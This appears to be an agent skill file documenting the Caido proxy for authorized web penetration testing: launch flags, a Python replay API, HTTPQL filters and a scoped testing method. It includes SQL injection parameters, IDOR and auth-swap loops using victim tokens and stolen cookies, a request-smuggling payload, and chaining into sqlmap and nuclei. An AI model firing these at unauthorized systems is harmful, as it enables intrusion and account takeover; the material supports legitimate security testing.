---
name: caido
description: Caido proxy launch flags, the sandbox-wired caido_api Python surface, and the full proxy-driven testing methodology including HTTPQL filtering, scope management, programmatic replay, and tool chaining.
---

# Caido CLI Playbook

Official docs:
- https://docs.caido.io/
- https://docs.caido.io/app/reference/httpql
- https://docs.caido.io/app/guides/filters_httpql
- https://docs.caido.io/app/quickstart/replay
- https://docs.caido.io/app/guides/domain_allowlist

Canonical syntax:
- Proxy process: `caido-cli [flags]`
- Python driving: `from caido_api import list_requests, view_request, repeat_request, list_sitemap, view_sitemap_entry, scope_rules`

The sandbox already launches `caido-cli` and wires `http_proxy`/`https_proxy` to it, so `curl`, `httpx`, `requests`, `agent-browser`, and every other tool that honors proxy env vars route through Caido automatically; `NO_PROXY=localhost,127.0.0.1` keeps CDP/local traffic out. All driving from the agent happens via the pre-installed `caido_api` module (see `python.md`), not by respawning `caido-cli`.

High-signal `caido-cli` flags (only used when restarting or reconfiguring the proxy):
- `-l, --listen <ADDR:PORT>` combined listener (default `127.0.0.1:8080`)
- `--proxy-listen <ADDR:PORT>` dedicated proxy listener
- `--ui-listen <ADDR:PORT>` dedicated UI listener
- `--invisible` invisible proxy mode (transparent, no CONNECT required)
- `--no-open` do not auto-open the UI in a browser
- `--no-sync` disable sync with Caido cloud
- `--data-path <DIR>` instance data directory
- `--import-ca-cert <FILE>` import an existing CA cert (`--import-ca-cert-pass` for its PKCS12 password)
- `--allow-guests` permit guest login (what the sandbox uses — `caido_api` logs in as guest automatically)
- `--safe` disable plugins and workflows (crash-recovery launch)
- `--reset-cache` clear local instance cache
- `--ui-domain <DOMAIN>` allowed domains for UI access
- `--no-renderer-sandbox` disable sandboxing for the renderer
- `--reset-credentials` reset the instance credentials (destructive — use only for recovery)
- `--registration-key <ckey_...>` register the instance in a workspace (env: `CAIDO_REGISTRATION_KEY`)
- `--debug` record debug logs; `--no-logging` disables file logging

High-signal `caido_api` helpers (full signatures introspected from the sandbox):
- `list_requests(httpql_filter=, first=50, after=, sort_by="timestamp", sort_order="desc", scope_id=)` returns a cursor-paginated connection of captured requests.
- `view_request(request_id, part="request")` fetches the raw request or response bytes for one captured exchange (`part="request"` or `"response"`).
- `repeat_request(request_id, modifications={...})` replays a captured request after modifying `url`, `params`, `headers`, `body`, or `cookies` — this is the programmatic match-and-replace primitive.
- `list_sitemap(scope_id=, parent_id=, depth="DIRECT", page=1, page_size=30)` walks Caido's tree view of the discovered surface; omit `parent_id` for roots, pass an entry id with `depth="DIRECT"` or `"ALL"` to drill in.
- `view_sitemap_entry(entry_id)` returns one sitemap entry plus its 30 most recent related requests.
- `scope_rules(action, allowlist=, denylist=, scope_id=, scope_name=)` manages the default scope (`action` is a `ScopeAction` — `GET`/`SET`/`UPDATE`/`CLEAR`).
- `scope_create / scope_list / scope_get / scope_update / scope_delete(client, ...)` manage named scopes using an explicit client from `get_client()`.
- `replay_send_raw(client, raw=..., connection=...)` sends arbitrary raw bytes down a connection (for cases `repeat_request` normalizes).

Agent-safe baseline for driving Caido from Python:
```python
import asyncio
from caido_api import list_requests, view_request, repeat_request, scope_rules

async def main():
    await scope_rules("SET", allowlist=["*.target.tld"], denylist=["*.target.tld/logout*"])
    page = await list_requests(httpql_filter='req.host.cont:"target.tld" AND req.method.eq:"POST"', first=50)
    for edge in page.edges:
        rid = edge.node.request.id
        body = await view_request(rid, part="request")
        raw = body.request.raw.decode("utf-8", errors="replace")
        if "id=" in raw:
            replay = await repeat_request(rid, modifications={"params": {"id": "1 OR 1=1"}})
            print(rid, replay)

asyncio.run(main())
```

Common patterns:
- Lock scope before any crawl/fuzz:
  `await scope_rules("SET", allowlist=["*.target.tld", "target.tld"], denylist=["*.target.tld/logout*", "*.target.tld/admin/delete*"])`
- List recent POSTs to the API:
  `await list_requests(httpql_filter='req.method.eq:"POST" AND req.path.cont:"/api/"', first=100)`
- Pull one request's raw bytes for payload crafting:
  `await view_request(request_id, part="request")`
- Replay with a header swap (classic match-and-replace):
  `await repeat_request(rid, modifications={"headers": {"Authorization": "Bearer <victim-token>"}})`
- Walk the discovered surface for an endpoint inventory:
  `await list_sitemap(depth="ALL")` then `view_sitemap_entry(entry_id)` on anything interesting.
- Named scope for a long-running engagement:
  `client = await get_client(); await scope_create(client, name="engagement-x", allowlist=[...])`
- Launch an isolated secondary proxy (second engagement, port collision):
  `caido-cli --proxy-listen 127.0.0.1:48081 --ui-listen 127.0.0.1:48082 --no-open --data-path /tmp/caido-alt`

Critical correctness rules:
- Caido is the primary proxy for the whole sandbox; `http_proxy`/`https_proxy` are already set, so **do not pass `--proxy` to tools that honor those vars** (`agent-browser`, `curl`, `httpx`, `requests`) — passing one overrides env with the same URL and sometimes misroutes TLS SNI/CONNECT.
- Set scope **before** firing crawls or fuzzers — out-of-scope traffic still gets captured by Caido but pollutes HTTPQL filtering, replay reasoning, and sitemap scoring.
- `caido_api` helpers are all `async`; call them from `asyncio.run(...)` or an outer async function. Awaiting them synchronously throws.
- Request/response raw bytes come back as `bytes` — decode with `errors="replace"` before string ops.
- `repeat_request` **is a side-effecting replay** — the mutated request is actually sent to the target. Treat it like a live request, not a read of local state.
- `list_requests` sort defaults to newest-first on `timestamp`; pass `sort_order="asc"` when ordering matters for session reconstruction.
- Pagination: `list_requests` returns a cursor-based connection; follow `edges[-1].cursor` back as `after=` for the next page.
- Scope rule patterns are glob-style; a bare host without `*.` doesn't match subdomains.
- `caido-cli` is a long-running server — don't `exec_command` it inline from an agent step; the sandbox already owns the process.

Usage rules:
- Prefer HTTPQL filters on `list_requests` over post-filtering in Python — the server does it faster and cheaper.
- Keep `first` modest (50-200); walk pages explicitly for larger sets.
- Use named scopes (`scope_create`) only when you need to switch between engagements; the default scope via `scope_rules` is enough for a single-target task.
- Use `replay_send_raw` only for cases where `repeat_request`'s structural `modifications` dict can't express the exact bytes (smuggling, raw-header spoofing).
- Do not persist Caido-side tokens or cookies into shell history; read them from `view_request` and keep them in Python locals.

Failure recovery:
- If `list_requests` returns empty for traffic you expect to see, verify the client actually used the proxy (`echo $http_proxy`; or re-run through `curl -x "$http_proxy"`), and that scope isn't denying the host.
- If `repeat_request` throws on connection errors, the target changed — refetch the base request with `view_request` and reissue.
- If `caido_api` imports fail (`ModuleNotFoundError`), the sandbox PYTHONPATH is missing `/opt/zen-python`; re-source `/etc/profile` or run `python3` from `/app/.venv/bin/python3`.
- If `caido-cli` itself is wedged (no new captures), launch a side instance with `--proxy-listen 127.0.0.1:48081 --data-path /tmp/caido-alt --no-open`, point tools at the new port with `-x`/`--proxy`, and keep the primary alone.

If uncertain, query web_search with:
`site:docs.caido.io <feature> httpql` or `site:docs.caido.io scope|replay|http_history`

---

## Proxy-Driven Testing Methodology

Every HTTP exchange from every tool flows through Caido. The methodology structures a full proxy-driven assessment in six phases.

### Phase 1 — Scope Configuration

Lock scope before any traffic flows. See **Scope Management** below for glob rules, `ScopeAction` values, and named scopes.

```python
await scope_rules("SET",
    allowlist=["*.target.tld", "target.tld"],
    denylist=["*.target.tld/logout*", "*.target.tld/static/*"])
```

### Phase 2 — Passive Collection

Launch crawlers and browser-driven exploration. All proxy-aware tools auto-route through Caido via `$http_proxy`/`$https_proxy`.

1. `katana -u https://target.tld -d 3 -jc -silent` — JS-aware crawl, captured in Caido.
2. `gospider -s https://target.tld -d 2 -c 5 --sitemap --robots` — sitemap/robots spider.
3. `agent-browser` for SPA content behind JS rendering.
4. Authenticated flows via `agent-browser` with session cookies.

All traffic is queryable immediately via `list_requests` — no export step.

### Phase 3 — History Analysis

Query captured traffic with HTTPQL (see **HTTPQL Filter Grammar** below) to surface interesting endpoints, parameters, and auth tokens.

Key queries:
- State-changing: `req.method.eq:"POST" OR req.method.eq:"PUT" OR req.method.eq:"DELETE"`
- Error responses: `resp.code.gte:400`
- Large responses: `resp.len.gt:50000`
- Auth headers: `req.header.cont:"Authorization"`
- JSON API: `req.header.cont:"application/json" AND req.method.eq:"POST"`

### Phase 4 — Targeted Replay

Use `repeat_request` (see **History Analysis and Request Replay** below) for auth-swap, IDOR, and parameter manipulation on discovered endpoints.

### Phase 5 — Active Testing

Export captured requests for specialized scanners (see **Chaining with Other Tools** below):
- `view_request` → file → `sqlmap -r`
- URL extraction → `nuclei -l`
- Directory patterns from sitemap → `ffuf`

### Phase 6 — Evidence Collection

Export request/response pairs for confirmed findings:
```python
async def collect_evidence(request_ids, output_dir="/tmp/evidence"):
    import os; os.makedirs(output_dir, exist_ok=True)
    for rid in request_ids:
        req_raw = await view_request(rid, part="request")
        resp_raw = await view_request(rid, part="response")
        with open(f"{output_dir}/{rid}_request.txt", "wb") as f:
            f.write(req_raw.request.raw)
        with open(f"{output_dir}/{rid}_response.txt", "wb") as f:
            f.write(resp_raw.response.raw)
```

---

## HTTPQL Filter Grammar

HTTPQL is Caido's query language for filtering captured traffic. All `list_requests(httpql_filter=...)` calls use this grammar. Field names and operators are verified against the official Caido HTTPQL reference (https://docs.caido.io/app/reference/httpql).

### Namespaces

| Namespace | Description |
|-----------|-------------|
| `req` | All proxied HTTP requests |
| `resp` | All proxied HTTP responses |
| `preset` | Saved filter presets |
| `row` | A request's numerical identifier in traffic tables |
| `source` | The Caido feature that generated the traffic (Search interface only) |

### Request Fields (`req.`)

| Field | Type | Description |
|-------|------|-------------|
| `req.method` | string | HTTP method (GET, POST, PUT, DELETE, etc.) |
| `req.host` | string | Host header value |
| `req.path` | string | URL path |
| `req.query` | string | URL query string |
| `req.header` | string | Request headers (searches across all headers) |
| `req.body` | string | Request body (excludes headers) |
| `req.raw` | string | Full raw request data |
| `req.ext` | string | File extension |
| `req.port` | integer | Target server port |
| `req.len` | integer | Request size in bytes |
| `req.tls` | boolean | Whether TLS/SSL was used |
| `req.created_at` | date | Timestamp (RFC3339, ISO 8601, RFC2822, RFC7231, ISO9075) |

### Response Fields (`resp.`)

| Field | Type | Description |
|-------|------|-------------|
| `resp.code` | integer | HTTP status code |
| `resp.header` | string | Response headers (searches across all headers) |
| `resp.body` | string | Response body (excludes headers) |
| `resp.raw` | string | Full raw response data |
| `resp.len` | integer | Response size in bytes |
| `resp.roundtrip` | integer | Total request/response cycle time in milliseconds |

### Operators

| Operator | Applies to | Description |
|----------|-----------|-------------|
| `eq` | string, integer | Equal (case-sensitive for strings) |
| `ne` | string, integer | Not equal (case-sensitive for strings) |
| `cont` | string | Contains (case-insensitive) |
| `ncont` | string | Does not contain (case-insensitive) |
| `like` | string | SQLite LIKE pattern (case-sensitive for Unicode beyond ASCII) |
| `nlike` | string | SQLite NOT LIKE pattern |
| `regex` | string | Matches regular expression (Rust-flavored syntax) |
| `nregex` | string | Does not match regular expression |
| `gt` | integer, date | Greater than |
| `gte` | integer, date | Greater than or equal |
| `lt` | integer, date | Less than |
| `lte` | integer, date | Less than or equal |

### Logical Operators

`AND` and `OR` combine clauses. They are case-insensitive and have the same priority — use parentheses for grouping when mixing.

### Syntax

```
<namespace>.<field>.<operator>:<value>
```

String values are quoted: `req.method.eq:"POST"`. Integer values are unquoted: `resp.code.eq:200`.

### Filter Recipes

| Purpose | HTTPQL |
|---------|--------|
| State-changing requests | `req.method.eq:"POST" OR req.method.eq:"PUT" OR req.method.eq:"DELETE"` |
| API errors | `req.path.cont:"/api/" AND resp.code.gte:400` |
| Auth headers | `req.header.cont:"Authorization"` |
| Specific cookies | `req.header.cont:"Cookie:" AND req.header.cont:"session_id="` |
| Large responses (data leak) | `resp.len.gt:100000` |
| Slow responses (timing) | `resp.roundtrip.gt:5000` |
| JSON API traffic | `req.header.cont:"application/json"` |
| Path pattern match | `req.path.regex:"^/api/v[0-9]+/users/[0-9]+"` |
| Non-TLS requests | `req.tls.eq:false` |
| ID parameters | `req.query.cont:"id="` |
| POST API non-200 | `req.method.eq:"POST" AND req.path.cont:"/api/" AND resp.code.ne:200` |
| File uploads | `req.header.cont:"multipart/form-data"` |
| By extension | `req.ext.eq:"json" OR req.ext.eq:"xml"` |

---

## Scope Management

Scope controls which traffic Caido tracks for analysis. Always configure scope before generating traffic.

### Default Scope via `scope_rules`

`ScopeAction` values:
- `GET` — retrieve current scope configuration
- `SET` — replace scope entirely with new allowlist/denylist
- `UPDATE` — merge new entries into existing scope
- `CLEAR` — remove all scope rules (captures everything)

```python
current = await scope_rules("GET")
await scope_rules("SET", allowlist=["*.target.tld", "target.tld"], denylist=["*.target.tld/logout*"])
await scope_rules("UPDATE", allowlist=["*.api.partner.tld"])
await scope_rules("CLEAR")
```

### Glob Pattern Rules

Scope patterns use glob syntax:
- `target.tld` — matches the exact apex domain only
- `*.target.tld` — matches all subdomains but NOT the apex
- `*.target.tld/api/*` — subdomains, restricted to `/api/` paths
- `target.tld/admin/*` — apex domain, restricted to `/admin/` paths

Common pitfall: using only `*.target.tld` misses the apex. Always include both:
```python
await scope_rules("SET", allowlist=["*.target.tld", "target.tld"])
```

Denylist patterns take priority over allowlist when both match:
```python
await scope_rules("SET",
    allowlist=["*.target.tld", "target.tld"],
    denylist=[
        "*.target.tld/logout*",        # never replay logout
        "*.target.tld/admin/delete*",   # never hit destructive endpoints
        "*.target.tld/static/*",        # skip static assets
        "*.target.tld/healthz",         # skip health checks
    ])
```

### Named Scopes

For multi-engagement assessments, named scopes isolate traffic per target:
```python
client = await get_client()
await scope_create(client, name="engagement-alpha", allowlist=["*.alpha.tld", "alpha.tld"])
await scope_create(client, name="engagement-beta", allowlist=["*.beta.tld", "beta.tld"])
scopes = await scope_list(client)                  # enumerate all named scopes
details = await scope_get(client, scope_id="<id>") # inspect one scope's rules
await scope_update(client, scope_id="<id>", denylist=["*.alpha.tld/admin/*"])
await scope_delete(client, scope_id="<id>")
```

Filter `list_requests` and `list_sitemap` to a named scope with `scope_id=`:
```python
reqs = await list_requests(httpql_filter='req.method.eq:"POST"', scope_id="<id>", first=100)
```

### Scope-Before-Test Discipline

Why scope must be locked before crawl/fuzz:
1. Out-of-scope captures pollute HTTPQL queries with irrelevant noise.
2. Sitemap entries for out-of-scope hosts distort the attack surface inventory.
3. `list_requests` without `scope_id` returns everything — unscoped crawl traffic overwhelms targeted results.
4. Replay reasoning on polluted history leads to testing wrong endpoints.

Sequence: scope → crawl → analyze → test. Never: crawl → scope → analyze.

---

## History Analysis and Request Replay

### Cursor-Based Pagination

`list_requests` returns a connection object with `edges` (list of results) and pagination cursors.

```python
import asyncio
from caido_api import list_requests

async def paginate_all():
    all_edges = []
    cursor = None
    while True:
        page = await list_requests(
            httpql_filter='req.host.cont:"target.tld"',
            first=200,
            after=cursor,
            sort_by="timestamp",
            sort_order="asc")
        if not page.edges:
            break
        all_edges.extend(page.edges)
        cursor = page.edges[-1].cursor
        print(f"  Fetched {len(all_edges)} total")
    return all_edges

asyncio.run(paginate_all())
```

Parameters:
- `first=<n>` — page size (default 50; keep ≤200)
- `after=<cursor>` — cursor from previous page's last edge
- `sort_by="timestamp"` — sort field
- `sort_order="desc"|"asc"` — newest-first (default) or oldest-first
- `scope_id=<id>` — restrict to named scope

### Viewing Raw Request/Response

`view_request(request_id, part=)` retrieves the raw bytes of a captured exchange.

```python
import asyncio
from caido_api import view_request

async def inspect(rid):
    req_data = await view_request(rid, part="request")
    raw_req = req_data.request.raw.decode("utf-8", errors="replace")
    print("--- REQUEST ---")
    print(raw_req[:2000])

    resp_data = await view_request(rid, part="response")
    raw_resp = resp_data.response.raw.decode("utf-8", errors="replace")
    print("--- RESPONSE ---")
    print(raw_resp[:2000])

asyncio.run(inspect("req_abc123"))
```

Raw bytes include the full HTTP message: request line/status line, headers, blank line, body. Always decode with `errors="replace"` — binary bodies (images, gzip) will contain non-UTF-8 bytes.

### Request Replay with Modifications

`repeat_request(request_id, modifications={...})` replays a captured request with structural modifications. This sends a live request to the target.

The `modifications` dict supports these keys:
- `url` — replace the full URL
- `params` — replace/add query parameters (dict)
- `headers` — replace/add headers (dict)
- `body` — replace the request body (string)
- `cookies` — replace/add cookies (dict)

Each key replaces or merges into the original request. Omitted keys leave the original values intact.

Inline examples — header swap, param iteration, cookie swap, body replace:
```python
await repeat_request(rid, modifications={"headers": {"Authorization": f"Bearer {victim}"}})
await repeat_request(rid, modifications={"params": {"id": "999"}})
await repeat_request(rid, modifications={"cookies": {"session_id": "stolen_value"}})
await repeat_request(rid, modifications={"body": '{"role":"admin"}'})
```

See **Programmatic Automation Patterns** below for full IDOR-loop, auth-swap, and session-comparison workflows.

Side-effect rules:
- Every `repeat_request` call sends real traffic — not a local simulation.
- Replaying logout invalidates the session; replaying delete destroys data.
- Rapid replay loops can trigger WAF blocks — add delays in loops.

---

## Sitemap Analysis

Caido builds a hierarchical sitemap from all captured traffic. Use it for endpoint inventory and attack surface mapping.

### Tree Traversal

```python
import asyncio
from caido_api import list_sitemap, view_sitemap_entry

async def walk_sitemap():
    roots = await list_sitemap(depth="DIRECT")
    for root in roots:
        print(f"Root: {root.label} (id={root.id})")
        children = await list_sitemap(parent_id=root.id, depth="DIRECT")
        for child in children:
            print(f"  /{child.label} (id={child.id})")
            details = await view_sitemap_entry(child.id)
            for req in details.requests[:5]:
                print(f"    {req.method} {req.path} -> {req.response_code}")

asyncio.run(walk_sitemap())
```

Parameters:
- `parent_id=` — omit for roots; pass an entry id to drill into that subtree
- `depth="DIRECT"` — immediate children only
- `depth="ALL"` — entire subtree recursively
- `page=`, `page_size=` — pagination (default page_size=30)
- `scope_id=` — restrict to named scope

### Endpoint Inventory and Directory Extraction

```python
async def extract_endpoints():
    all_entries = await list_sitemap(depth="ALL")
    unique = set()
    dirs = set()
    for entry in all_entries:
        details = await view_sitemap_entry(entry.id)
        for req in details.requests:
            unique.add((req.method, req.path))
        if "/" in entry.label:
            dirs.add("/".join(entry.label.split("/")[:-1]))
    for method, path in sorted(unique):
        print(f"  {method:6s} {path}")
    with open("/tmp/dirs.txt", "w") as f:
        f.write("\n".join(sorted(dirs)))
```

Feed directory prefixes to ffuf: `ffuf -u https://target.tld/FUZZ -w /tmp/dirs.txt -mc 200,301,302`

---

## Programmatic Automation Patterns

All patterns below use only the documented `caido_api` functions. Every example is `async` and runs under `asyncio.run(...)`.

### IDOR Testing Loop

Iterate over captured requests with ID parameters, replay each with different IDs, compare responses.

```python
import asyncio
from caido_api import list_requests, repeat_request, view_request

async def idor_scan():
    reqs = await list_requests(
        httpql_filter='req.path.regex:"/api/(users|orders|profiles)/[0-9]+" AND req.method.eq:"GET"',
        first=50)

    for edge in reqs.edges:
        rid = edge.node.request.id
        original_path = edge.node.request.path
        original_code = edge.node.response.code
        original_len = edge.node.response.len

        for test_id in ["1", "0", "999999", "-1"]:
            result = await repeat_request(rid,
                modifications={"params": {"id": test_id}})
            print(f"  {original_path} id={test_id} -> code={result}, orig_code={original_code}")

asyncio.run(idor_scan())
```

### Auth-Swap Testing (Horizontal Privilege Escalation)

Same loop pattern as IDOR, but swap the Authorization header instead of a parameter:
```python
async def auth_swap_test(victim_token):
    reqs = await list_requests(
        httpql_filter='req.header.cont:"Authorization" AND req.path.cont:"/api/"', first=100)
    for edge in reqs.edges:
        result = await repeat_request(edge.node.request.id,
            modifications={"headers": {"Authorization": f"Bearer {victim_token}"}})
        print(f"  {edge.node.request.method} {edge.node.request.path}: orig={edge.node.response.code}")
```

### Session Comparison

Compare traffic captured under two named scopes to find endpoints exclusive to one role:
```python
async def compare_sessions(scope_a, scope_b):
    reqs_a = await list_requests(scope_id=scope_a, first=500)
    reqs_b = await list_requests(scope_id=scope_b, first=500)
    paths_a = {(e.node.request.method, e.node.request.path) for e in reqs_a.edges}
    paths_b = {(e.node.request.method, e.node.request.path) for e in reqs_b.edges}
    for method, path in sorted(paths_a - paths_b):
        print(f"  Only in A: {method} {path}")
    for method, path in sorted(paths_b - paths_a):
        print(f"  Only in B: {method} {path}")
```

### Parameter Discovery

Extract unique parameter names from captured traffic for targeted fuzzing:
```python
async def extract_params():
    reqs = await list_requests(httpql_filter='req.query.cont:"="', first=500)
    params = set()
    for edge in reqs.edges:
        raw = await view_request(edge.node.request.id, part="request")
        text = raw.request.raw.decode("utf-8", errors="replace")
        first_line = text.split("\r\n")[0]
        if "?" in first_line:
            query = first_line.split("?")[1].split(" ")[0]
            for pair in query.split("&"):
                if "=" in pair:
                    params.add(pair.split("=")[0])
    with open("/tmp/params.txt", "w") as f:
        f.write("\n".join(sorted(params)))
```

Feed to arjun: `arjun -u https://target.tld/endpoint -w /tmp/params.txt`

### Bulk Replay

Replay a set of captured requests with the same modification (e.g., header injection across all API GETs):
```python
async def bulk_header_inject(header_name, header_value):
    reqs = await list_requests(
        httpql_filter='req.path.cont:"/api/" AND req.method.eq:"GET"', first=200)
    for edge in reqs.edges:
        result = await repeat_request(edge.node.request.id,
            modifications={"headers": {header_name: header_value}})
        print(f"  {edge.node.request.path} -> {result}")
```

---

## Raw Replay

`replay_send_raw(client, raw=..., connection=...)` sends arbitrary bytes without normalization. Use when `repeat_request`'s structural modifications can't express the exact bytes — HTTP request smuggling (CL/TE conflicts), CRLF header injection, duplicate headers, bare-LF line endings, null bytes.

```python
client = await get_client()
smuggle_payload = (
    b"POST /api/endpoint HTTP/1.1\r\n"
    b"Host: target.tld\r\n"
    b"Content-Length: 6\r\n"
    b"Transfer-Encoding: chunked\r\n"
    b"\r\n"
    b"0\r\n\r\nG"
)
result = await replay_send_raw(client,
    raw=smuggle_payload,
    connection={"host": "target.tld", "port": 443, "tls": True})
```

| | `repeat_request` | `replay_send_raw` |
|---|---|---|
| Input | Request ID + modifications dict | Raw bytes |
| Normalization | Headers normalized, Content-Length recalculated | None — sent as-is |
| Base request | Must reference a captured request | Standalone |
| Client | Implicit | Requires `get_client()` |
| Connection | Inferred from original | Must specify `host`, `port`, `tls` |

Prefer `repeat_request` for standard testing. Use `replay_send_raw` only for protocol-level attacks.

---

## Chaining with Other Tools

### Automatic Proxy Routing

All proxy-aware tools auto-route through Caido via sandbox environment variables:
- `http_proxy` / `https_proxy` point to `127.0.0.1:8080` (Caido's default listener)
- `NO_PROXY=localhost,127.0.0.1` keeps local traffic out of Caido

Tools that auto-route: `curl`, `httpx`, `requests` (Python), `agent-browser`, `katana`, `gospider`, `ffuf`, `dirsearch`, `feroxbuster`, `nuclei` (with `-p`), `arjun`, `wapiti`.

Do not pass `--proxy` / `-x` to these tools — the env var is already set.

### Caido → sqlmap

Export a captured request to a file, then feed to sqlmap:
```python
async def export_request(rid, path="/tmp/sqlmap_req.txt"):
    raw = await view_request(rid, part="request")
    with open(path, "wb") as f:
        f.write(raw.request.raw)
```
Then: `sqlmap -r /tmp/sqlmap_req.txt --batch --level 2 --risk 1 --random-agent`

→ See `sqlmap.md` for full sqlmap methodology.

### Caido → ffuf

Extract directory prefixes from sitemap, feed to ffuf for deeper content discovery:
```
ffuf -u https://target.tld/FUZZ -w /tmp/dirs.txt -mc 200,301,302,403
```

→ See `ffuf.md` for full ffuf methodology.

### Caido → nuclei

Extract live URLs from Caido history into a target list:
```python
async def urls_for_nuclei():
    reqs = await list_requests(first=500)
    urls = set()
    for edge in reqs.edges:
        node = edge.node.request
        urls.add(f"https://{node.host}{node.path}")
    with open("/tmp/nuclei_targets.txt", "w") as f:
        f.write("\n".join(sorted(urls)))
```
Then: `nuclei -l /tmp/nuclei_targets.txt -as -s critical,high -rl 50 -j -o nuclei.jsonl`

→ See `nuclei.md` for full nuclei methodology.

### Crawlers → Caido → Analysis

`katana` and `gospider` crawls are automatically captured in Caido history. After a crawl completes, use HTTPQL to analyze what was discovered:
```python
post_crawl = await list_requests(
    httpql_filter='req.path.cont:"/api/" AND resp.code.lt:400',
    first=500, sort_order="asc")
```

→ See `katana.md`, `gospider.md` for crawler methodology.

### Caido → interactsh-client

For blind vulnerability testing, combine Caido replay with interactsh callbacks:
1. Start interactsh-client to get a callback domain.
2. Use `repeat_request` to inject the callback URL into parameters.
3. Monitor interactsh for incoming interactions.

→ See `interactsh-client.md` for OAST methodology.

Companions and references:
- `python.md` — full `caido_api` import catalogue and the `exec_command` workflow for Python scripts.
- `agent_browser.md` — browser traffic is already Caido-proxied; the `http_exchange_ids` from a browser-driven test resolve against `caido_api.list_requests`.
- `httpx.md`, `ffuf.md`, `katana.md`, `sqlmap.md` — these inherit the proxy from env; use `caido_api` after each run to inventory and replay what they produced.
